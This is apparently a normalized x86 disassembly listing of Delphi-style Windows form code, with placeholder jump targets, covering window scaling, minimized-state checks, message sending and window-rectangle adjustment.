mov eax [ ebp + 0x10 ]
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_453360
sub_453b90
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_453aec
mov ecx edi
mov edx esi
mov eax ebx
call sub_441ed8
pop edi
pop esi
pop ebx
retn
sub_453bb8
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
inc [ eax + 0x214 ]
xor edx edx
push ebp
push sub_453c22
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4409b8
xor eax eax
mov edx [ ebx + 0x4 ]
sub edx 0x1
jb r-xdata
xor eax eax
jmp r-xdata
je r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xd0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_453c29
mov eax [ ebp - 0x4 ]
dec [ eax + 0x214 ]
retn
mov al 0x1
jmp r-xdata
dec edx
je r-xdata
mov al 0x2
jmp r-xdata
sub_453c29
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
xor eax eax
push ebp
push sub_453c61
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_453808
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_453c68
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
retn
sub_453c68
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
cmp [ eax + 0x1c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_453888
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
sub_453cdc
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax ebx
call sub_43b614
mov edx [ ebx + 0x20c ]
mov edx [ edx + 0x10 ]
call sub_421f24
push eax
lea eax [ esp + 0x4 ]
push eax
mov eax ebx
call sub_43b5d0
mov edx eax
mov edi [ ebx + 0x208 ]
mov eax [ edi + 0x10 ]
call sub_421f24
mov ecx eax
mov eax [ ebx + 0x20c ]
mov edx [ eax + 0xc ]
neg edx
mov eax [ edi + 0xc ]
neg eax
call sub_41250c
push esi
mov edi esi
lea esi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov edx esi
mov eax ebx
call sub_43e438
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_453d4c
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_453dad
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_4033b0
test al al
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_441748
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_453db4
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x4 ] edx
retn
mov eax [ ebp - 0x8 ]
mov [ eax + 0x4 ] 0x1
sub_453ddc
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
xor ebx ebx
mov [ ebp - 0x114 ] ebx
test dl dl
je r-xdata
mov ebx ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_453f40
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_453f20
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov ecx ebx
xor edx edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xe0 ]
mov eax [ ebp - 0x4 ]
call sub_40316c
cmp eax [ r-xdata ]
je r-xdata
add esp 0xfffffff0
call sub_403530
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_453f27
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x1
xor eax eax
push ebp
push sub_453ee8
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_4136d8
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfe
retn
lea edx [ ebp - 0x110 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_403174
lea eax [ ebp - 0x110 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x4
lea eax [ ebp - 0x10 ]
push eax
push 0x0
lea edx [ ebp - 0x114 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x114 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b42c
call sub_403998
sub_453f68
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x234 ] 0x0
jne r-xdata
test [ ebx + 0x2f4 ] 0x20
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd4 ]
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb3
call sub_403420
and [ ebx + 0x2f4 ] 0xdf
sub_453fa0
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_4535ac
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
xor edx edx
mov eax ebx
call sub_43b33c
xor edx edx
mov eax ebx
call sub_43b360
mov edx 0x140
mov eax ebx
call sub_43b388
mov edx 0xf0
mov eax ebx
call sub_43b3ac
mov dl 0x1
mov eax [ r-xdata ]
call sub_4214b8
mov esi eax
mov [ ebx + 0x240 ] esi
push 0x31
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
push 0x32
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax [ ebx + 0x240 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebx + 0x240 ]
mov [ eax + 0x14 ] ebx
mov [ eax + 0x10 ] sub_4548bc
mov dl 0x1
mov eax [ r-xdata ]
call sub_41cde0
mov esi eax
mov [ ebx + 0x238 ] esi
mov eax esi
mov edx ebx
call sub_43a7a8
mov al [ r-xdata ]
mov [ ebx + 0x228 ] al
mov [ ebx + 0x229 ] 0x2
mov [ ebx + 0x22b ] 0x0
mov [ ebx + 0x231 ] 0x3
mov [ ebx + 0x244 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov [ ebx + 0x25c ] eax
mov [ ebx + 0x235 ] 0x1
mov eax ebx
call sub_40316c
mov [ ebx + 0xb8 ] eax
mov [ ebx + 0x2e1 ] 0xff
xor eax eax
mov [ ebx + 0x2ec ] eax
xor edx edx
mov eax ebx
call sub_454c20
xor edx edx
mov eax ebx
call sub_43bd90
xor edx edx
mov eax ebx
call sub_43bcf8
mov dl 0x1
mov eax ebx
call sub_44250c
mov edx ebx
mov eax [ rw-data ]
call sub_459284
mov [ ebx + 0x2e4 ] 0xa
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403530
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
call sub_403588
pop [ fs : 0x0 ]
add esp 0xc
sub_454119
add [ eax ] al
add [ ebx - 0x75 ] dl
fsub [ ecx + rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov eax ebx
call sub_419690
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
mov edx ebx
call sub_413a5c
xor edx edx
mov eax ebx
call sub_416614
cmp [ ebx + 0x264 ] 0x0
je r-xdata
cmp [ ebx + 0x22f ] 0x1
je r-xdata
mov eax [ ebx + 0x264 ]
mov edx [ eax ]
call [ edx + 0xc ]
cmp [ ebx + 0x234 ] 0x0
jne r-xdata
mov eax ebx
call sub_45812c
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd8 ]
sub_454184
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_403598
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
xor eax eax
push ebp
push sub_45424e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x234 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_456aa8
mov eax [ ebp - 0x4 ]
call sub_4426d0
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xd8 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4592bc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_403224
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x240 ]
call sub_403224
mov eax [ ebp - 0x4 ]
add eax 0x2f0
call sub_40ccd0
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_453624
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454255
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xac ]
sub_454268
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2d2 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x2
je r-xdata
xor eax eax
push ebp
push j_sub_4036ac#9
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2d4 ]
call [ ebx + 0x2d0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_454c20
sub_4542ae
mov eax [ ebp - 0x4 ]
mov si 0xffad
call sub_403420
test al al
jne r-xdata
call sub_403a14
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x2
je r-xdata
call sub_4039c0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_454c20
sub_4542e4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2da ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push sub_454325
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2dc ]
call [ ebx + 0x2d8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_454344
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_43dca0
mov eax [ ebx + 0x220 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi eax
xor eax eax
mov [ ebx + 0x220 ] eax
mov eax edi
mov si 0xffb8
call sub_403420
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_4565ec
sub_454380
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_43b09c
mov eax ebx
sub al 0x1
jb r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
je r-xdata
test [ edi + 0x1c ] 0x1
jne r-xdata
cmp [ edi + 0x2f0 ] 0x0
jne r-xdata
mov ebp [ edi + 0x2f0 ]
test ebp ebp
je r-xdata
jmp r-xdata
cmp [ edi + 0x250 ] 0x0
je r-xdata
cmp [ edi + 0x248 ] 0x0
jne r-xdata
mov edx esi
mov eax [ edi + 0x2f0 ]
call sub_4137bc
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031f4
mov [ edi + 0x2f0 ] eax
cmp esi [ edi + 0x248 ]
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx ebx
mov edx esi
mov eax [ edi + 0x250 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp edi [ esi + 0x4 ]
jne r-xdata
cmp esi [ edi + 0x258 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_4559e4
mov edx esi
mov eax ebp
call sub_413a5c
jmp r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
cmp esi [ edi + 0x260 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_4559bc
mov edx esi
mov eax edi
call sub_4559e4
jmp r-xdata
xor edx edx
mov eax edi
call sub_455998
sub_45448c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_43ec64
xor edx edx
push ebp
push sub_4546e2
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x268 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x26c ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x270 ] edx
xor ebx ebx
mov al [ rw-data ]
xor al 0x1
mov edx [ ebp - 0x4 ]
mov [ edx + 0x234 ] al
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_43e3c0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x25c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x270 ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
test eax eax
jle r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_43b5e8
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
mov dl [ r-xdata ]
mov [ eax + 0x98 ] dl
test bl bl
jne r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_43b62c
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x25c ] eax
mov eax [ ebp - 0x4 ]
call sub_454814
mov esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
cmp esi eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x25c ]
mov edx [ rw-data ]
cmp eax [ edx + 0x40 ]
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax [ ebp - 0x4 ]
call sub_43cd98
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4546e9
mov eax [ ebp - 0x4 ]
call sub_43ec6c
retn
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_453aec
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_441e90
mov bl 0x1
mov ecx eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_453aec
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x270 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_441e90
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x25c ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x68 ]
mov eax esi
call sub_41c6a4
push eax
call MulDiv
mov edx eax
mov eax esi
call sub_41c6ac
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x268 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x26c ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fa ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fa ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fe ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fe ] eax
sub_4546f1
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43f70c
push 0x0
push 0x0
push ebx
push sub_4547f8
mov cl [ ebx + 0x5e ]
xor cl 0x1
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push sub_4547c4
push ebx
push sub_4547dc
mov cl [ ebx + 0x5e ]
xor cl 0x1
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push r-xdata
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop edi
pop esi
pop ebx
retn
sub_4547a3
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov eax esi
call sub_416d0c
test al al
je r-xdata
pop esi
pop ebx
retn
mov dl 0x1
mov eax ebx
call sub_43bcf8
sub_45482f
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add bl al
lea eax [ eax ]
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_453aec
mov ecx edi
mov edx esi
mov eax ebx
call sub_441e90
mov eax ebx
call sub_454918
test al al
je r-xdata
push edi
push esi
mov ebp [ ebx + 0x68 ]
mov eax ebp
call sub_41c748
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_41c764
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_43b614
mov ebp eax
push edi
push esi
mov eax ebx
call sub_43b5d0
push eax
call MulDiv
mov edx eax
mov eax ebx
call sub_454bc0
push edi
push esi
push ebp
call MulDiv
mov edx eax
mov eax ebx
call sub_454bf0
sub_4548bc
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax ebx
call sub_4423cc
push eax
call IsIconic
test eax eax
je r-xdata
mov eax ebx
call sub_4426d0
test al al
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
cmp [ ebx + 0x229 ] 0x3
je r-xdata
mov eax ebx
call sub_456c1c
push eax
push 0x1
push 0x80
mov eax ebx
call sub_4423cc
push eax
call SendMessageA
pop ebx
retn
sub_454950
push ebx
mov ebx eax
mov eax ebx
call sub_45586c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov al [ ebx + 0x229 ]
sub al 0x2
je r-xdata
mov al 0x1
sub al 0x3
je r-xdata
mov al 0x1
pop ebx
retn
xor eax eax
jmp r-xdata
cmp al [ ebx + 0x210 ]
jne r-xdata
sub_4549e4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4423cc
push eax
call IsIconic
test eax eax
je r-xdata
mov edx esi
mov eax ebx
call sub_442494
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call SetRect
push 0xffffffec
mov eax ebx
call sub_4423cc
push eax
call GetWindowLongA
push eax
cmp [ ebx + 0x248 ] 0x0
setne al
neg al
sbb eax eax
push eax
push 0xfffffff0
mov eax ebx
call sub_4423cc
push eax
call GetWindowLongA
push eax
push esi
call AdjustWindowRectEx
mov eax [ ebx + 0x4c ]
sub eax [ esi + 0xc ]
add eax [ esi + 0x4 ]
push eax
mov eax [ ebx + 0x48 ]
sub eax [ esi + 0x8 ]
add eax [ esi ]
push eax
push 0x0
push 0x0
push esi
call SetRect
pop esi
pop ebx
retn
sub_454a6c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx esi
mov eax ebx
call sub_442970
cmp ebx esi
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
mov eax ebx
call sub_419a14
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
mov edx edi
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4199e8
mov edi eax
mov eax edi
mov si 0xfff1
call sub_403420
test al al
jne r-xdata
sub_454ad8
push ebx
push esi
mov ebx eax
cmp [ ebx + 0xa0 ] 0x0
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov esi eax
mov eax ebx
call sub_40316c
cmp esi eax
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_454b04
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebp eax
mov eax [ esp ]
mov edx [ r-xdata ]
call sub_4033b0
test al al
je r-xdata
mov eax ebp
call sub_43f0fc
sub [ esp + 0x4 ] eax
mov [ esp + 0x8 ] 0xffffffff
mov eax ebp
call sub_419a14
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebp
call sub_4429b8
jmp r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
inc [ esp + 0x8 ]
mov eax [ esp + 0x8 ]
cmp eax [ esp + 0x4 ]
jne r-xdata
mov edx edi
mov eax ebp
call sub_4199e8
mov si 0xfff1
call sub_403420
test al al
jne r-xdata
mov edx edi
mov eax [ esp ]
call sub_419a24
jmp r-xdata
sub_454b98
push ebx
mov ebx eax
cmp dl [ ebx + 0x60 ]
je r-xdata
pop ebx
retn
mov eax ebx
call sub_43bdb4
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_43cd98
sub_454bc0
push ebx
mov ebx eax
test [ ebx + 0x54 ] 0x8
je r-xdata
mov eax ebx
call sub_43b5e8
pop ebx
retn
mov [ ebx + 0x268 ] edx
mov al [ r-xdata ]
or al [ ebx + 0x98 ]
mov [ ebx + 0x98 ] al
pop ebx
retn
sub_454bf0
push ebx
mov ebx eax
test [ ebx + 0x54 ] 0x8
je r-xdata
mov eax ebx
call sub_43b62c
pop ebx
retn
mov [ ebx + 0x26c ] edx
mov al [ r-xdata ]
or al [ ebx + 0x98 ]
mov [ ebx + 0x98 ] al
pop ebx
retn
sub_454c20
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi + 0x2f4 ] 0x1
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
mov edx ebx
mov eax esi
call sub_43baec
cmp bl [ esi + 0x57 ]
je r-xdata
and [ esi + 0x2f4 ] 0xfd
pop esi
pop ebx
retn
or [ esi + 0x2f4 ] 0x2
jmp r-xdata
mov eax esi
call sub_455d58
pop esi
pop ebx
retn
sub_454c64
push ebp
mov ebp esp
push 0x0
xor edx edx
push ebp
push sub_454cbd
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454cc4
lea eax [ ebp - 0x4 ]
call sub_403f5c
retn
cmp [ eax + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3f0
call sub_403998
sub_454ccc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
cmp ebx esi
je r-xdata
test eax eax
jne r-xdata
mov edx esi
mov eax ebx
call sub_43baa0
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov eax ebx
call sub_43f924
mov eax ebx
call sub_43fac0
sub_454d04
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_419860
cmp [ ebx + 0x250 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax [ ebx + 0x250 ]
mov ebx [ eax ]
call [ ebx + 0x2c ]
sub_454d44
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
mov edx eax
cmp edx 0x46
jg r-xdata
sub edx 0xb01a
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
dec edx
je r-xdata
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x1c ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
add edx 0xfffffffa
sub edx 0x3
jb r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43fde0
mov eax [ ebp - 0x4 ]
mov si 0xffb3
call sub_403420
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
dec eax
sub al 0x2
jae r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub edx 0x22
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffb1
call sub_403420
jmp r-xdata
cmp eax [ rw-data ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
sub al 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx ] 0x7
jne r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cmp [ eax ] 0x1
jne r-xdata
dec edx
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb025
mov eax [ ebp - 0x4 ]
call sub_43cd98
push 0x0
xor ecx ecx
mov edx 0xb024
mov eax [ ebp - 0x4 ]
call sub_43cd98
push 0x0
xor ecx ecx
mov edx 0xb035
mov eax [ ebp - 0x4 ]
call sub_43cd98
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax [ ebp - 0x4 ]
call sub_43cd98
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax [ ebp - 0x4 ]
call sub_43cd98
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax [ ebp - 0x4 ]
call sub_43cd98
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x229 ]
sub al 0x2
je r-xdata
sub al 0x2
jne r-xdata
mov eax [ ebx + 0x8 ]
or [ eax + 0x18 ] 0x2
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov esi [ ebx + 0x8 ]
cmp [ esi ] 0x1
jne r-xdata
jmp r-xdata
mov eax [ ebx + 0x8 ]
or [ eax + 0x18 ] 0x1
jmp r-xdata
sub al 0x3
jne r-xdata
xor esi esi
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
xor ecx ecx
call sub_44ee20
mov edi eax
test edi edi
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
